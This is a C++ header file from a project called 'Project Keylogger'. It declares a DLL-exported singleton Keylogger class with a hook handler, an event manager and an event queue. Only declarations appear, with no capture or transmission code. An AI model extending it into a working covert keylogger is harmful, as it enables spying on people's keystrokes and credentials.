/**
 * Project Keylogger
 */


#ifndef _KEYLOGGER_H
#define _KEYLOGGER_H

#include <iostream>
#include <vector>

#include "AEvent.h"
#include "EventManager.h"
#include "HookHandler.h"

class __declspec(dllexport)  Keylogger {
public: 
	static Keylogger _instance;

public:
    Keylogger();  
    bool init();   
    void run();
    bool stop();
    bool kill();
    static Keylogger& getInstance();
    bool pushToQueue(AEvent*);

private: 
    EventManager _eventManager;
    HookHandler _hookHandler;
    std::vector<AEvent*> _events;
};

#endif //_KEYLOGGER_H